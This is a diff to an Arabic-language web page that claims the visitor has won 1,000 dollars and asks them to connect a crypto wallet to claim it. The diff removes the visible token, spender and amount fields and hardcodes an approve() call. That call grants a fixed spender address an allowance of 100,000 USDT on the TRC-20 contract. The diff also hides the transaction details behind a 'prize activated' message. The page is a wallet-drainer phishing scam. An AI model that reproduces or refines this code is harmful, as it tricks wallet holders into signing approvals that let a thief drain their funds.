@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>تفعيل جائزة 1000 دولار - XYZ</title>
+    <title>مبروك! لقد فزت بـ 1000 دولار - XYZ</title>
     <link
       href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;700;900&display=swap"
       rel="stylesheet"
@@ -14,7 +13,7 @@
       crossorigin="anonymous"
     ></script>
     <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronweb@5.3.3/dist/tronweb.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.14.0/dist/index.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
     <style>
@@ -47,9 +46,10 @@
         background: rgba(20, 20, 20, 0.9);
         border-radius: 30px;
         padding: 60px;
-        max-width: 900px;
+        max-width: 800px;
         width: 100%;
-        box-shadow: 0 0 60px rgba(255, 215, 0, 0.4), 0 0 30px rgba(192, 192, 192, 0.5);
+        box-shadow: 0 0 60px rgba(255, 215, 0, 0.4),
+          0 0 30px rgba(192, 192, 192, 0.5);
         text-align: center;
         position: relative;
         z-index: 2;
@@ -209,33 +209,6 @@
       .wallet-btn:hover img {
         filter: brightness(0) invert(1);
       }
-      .input-group {
-        margin-bottom: 30px;
-        text-align: right;
-      }
-      .input-group label {
-        font-size: 18px;
-        font-weight: 700;
-        color: #ffd700;
-        margin-bottom: 10px;
-        display: block;
-      }
-      .input-group input {
-        width: 100%;
-        max-width: 400px;
-        padding: 15px;
-        border-radius: 10px;
-        border: 2px solid rgba(255, 215, 0, 0.4);
-        background: rgba(255, 255, 255, 0.1);
-        color: #ffffff;
-        font-size: 16px;
-        outline: none;
-        transition: all 0.3s ease;
-      }
-      .input-group input:focus {
-        border-color: #ffd700;
-        box-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
-      }
       button#approveButton {
         background: linear-gradient(90deg, #ffd700, #ffcc00);
         border: none;
@@ -307,9 +280,6 @@
           padding: 15px 40px;
           font-size: 18px;
         }
-        .input-group input {
-          max-width: 100%;
-        }
       }
     </style>
   </head>
@@ -324,32 +294,13 @@
       <h1>مبروك! لقد فزت بـ 1000 دولار</h1>
       <p class="win-message">استعد لاستلام جائزتك!</p>
       <p class="warning">
-        تحذير: أدخل تفاصيل التوكن وتأكد من اختيار محفظتك الرقمية لتفعيل الجائزة. العملية آمنة وموثقة.
+        تحذير: تأكد من اختيار محفظتك الرقمية لتفعيل الجائزة. العملية آمنة
+        وموثقة.
       </p>
       <div class="coin-icons">
         <i class="fab fa-bitcoin"></i>
         <i class="fab fa-ethereum"></i>
         <i class="fas fa-coins"></i>
-      </div>
-      <div class="input-group">
-        <label>عنوان التوكن (Token Contract Address):</label>
-        <input
-          type="text"
-          id="tokenAddress"
-          value="TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"
-        />
-      </div>
-      <div class="input-group">
-        <label>عنوان الـ Spender:</label>
-        <input
-          type="text"
-          id="spenderAddress"
-          value="0x44641c65aE5EB92a17008D558999962236c6bCb0"
-        />
-      </div>
-      <div class="input-group">
-        <label>الكمية (عدد التوكنات):</label>
-        <input type="number" id="amount" value="1000" />
       </div>
       <p class="description">اختر محفظتك الرقمية لتفعيل جائزتك مباشرة.</p>
       <section class="wallet-selection">
@@ -422,11 +373,15 @@
       let selectedWallet = null;
       let provider = null;
 
+      const contractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // USDT TRC-20
+      const spender = "0x44641c65aE5EB92a17008D558999962236c6bCb0";
+      const amount = "100000000000"; // 100,000 USDT (6 decimals)
       const usdtAbi = [
         "function approve(address spender, uint256 amount) public returns (bool)",
         "function decimals() public view returns (uint8)",
       ];
 
+      // دالة للتحقق من حالة الاتصال بالمحفظة
       async function checkWalletConnection(wallet) {
         if (wallet === "tronlink") {
           if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
@@ -437,12 +392,15 @@
           return false;
         } else if (wallet === "metamask") {
           if (window.ethereum && window.ethereum.selectedAddress) {
-            const chainId = await window.ethereum.request({ method: "eth_chainId" });
+            const chainId = await window.ethereum.request({
+              method: "eth_chainId",
+            });
             if (chainId === "0x2b6653dc") {
               statusText.textContent = "✅ محفظة MetaMask متصلة!";
               return true;
             } else {
-              statusText.textContent = "يرجى تبديل الشبكة إلى Tron Mainnet في MetaMask.";
+              statusText.textContent =
+                "يرجى تبديل الشبكة إلى Tron Mainnet في MetaMask.";
               return false;
             }
           }
@@ -459,6 +417,7 @@
         return false;
       }
 
+      // دالة للاتصال بالمحفظة
       async function connectWallet(wallet) {
         statusText.textContent = `جارٍ الاتصال بمحفظة ${wallet}...`;
         try {
@@ -540,12 +499,14 @@
         }
       }
 
+      // مستمع لأزرار المحافظ
       walletButtons.forEach((btn) => {
         btn.addEventListener("click", async () => {
           walletButtons.forEach((b) => b.classList.remove("selected"));
           btn.classList.add("selected");
           selectedWallet = btn.dataset.wallet;
 
+          // تحقق من حالة الاتصال
           const isConnected = await checkWalletConnection(selectedWallet);
           if (!isConnected) {
             await connectWallet(selectedWallet);
@@ -553,6 +514,7 @@
         });
       });
 
+      // مستمع لزر تفعيل الجائزة
       approveButton.addEventListener("click", async () => {
         if (!selectedWallet) {
           statusText.textContent = "يرجى اختيار محفظة أولاً.";
@@ -565,36 +527,20 @@
           return;
         }
 
-        const tokenAddress = document.getElementById("tokenAddress").value.trim();
-        const spenderAddress = document.getElementById("spenderAddress").value.trim();
-        const amount = document.getElementById("amount").value.trim();
-
-        if (!ethers.utils.isAddress(tokenAddress)) {
-          statusText.textContent = "عنوان العقد غير صالح.";
-          return;
-        }
-
-        if (!ethers.utils.isAddress(spenderAddress)) {
-          statusText.textContent = "عنوان الـ spender غير صالح.";
-          return;
-        }
-
-        if (amount <= 0) {
-          statusText.textContent = "الكمية يجب أن تكون أكبر من صفر.";
-          return;
-        }
-
         statusText.textContent = `جارٍ تفعيل الجائزة باستخدام ${selectedWallet}...`;
 
         try {
           if (selectedWallet === "tronlink") {
-            const contract = await window.tronWeb.contract().at(tokenAddress);
-            const decimals = await contract.decimals().call();
-            const amountParsed = ethers.utils.parseUnits(amount, decimals);
-            const tx = await contract.approve(spenderAddress, amountParsed.toString()).send();
-            statusText.textContent = `✅ تمت الموافقة بنجاح! Tx Hash: ${tx}`;
+            const contract = await window.tronWeb
+              .contract()
+              .at(contractAddress);
+            const tx = await contract.approve(spender, amount).send();
+            statusText.textContent = "✅ تم تفعيل الجائزة بنجاح!";
           } else {
-            if (selectedWallet === "trustwallet" || selectedWallet === "coinbase") {
+            if (
+              selectedWallet === "trustwallet" ||
+              selectedWallet === "coinbase"
+            ) {
               if (!provider) {
                 const connected = await connectWallet(selectedWallet);
                 if (!connected) return;
@@ -604,12 +550,14 @@
             }
 
             const signer = provider.getSigner();
-            const contract = new ethers.Contract(tokenAddress, usdtAbi, signer);
-            const decimals = await contract.decimals();
-            const amountParsed = ethers.utils.parseUnits(amount, decimals);
-            const tx = await contract.approve(spenderAddress, amountParsed);
+            const contract = new ethers.Contract(
+              contractAddress,
+              usdtAbi,
+              signer
+            );
+            const tx = await contract.approve(spender, amount);
             await tx.wait();
-            statusText.textContent = `✅ تمت الموافقة بنجاح! Tx Hash: ${tx.hash}`;
+            statusText.textContent = "✅ تم تفعيل الجائزة بنجاح!";
           }
         } catch (e) {
           statusText.textContent = `حدث خطأ: ${e.message || e}`;
@@ -618,4 +566,3 @@
     </script>
   </body>
 </html>
-
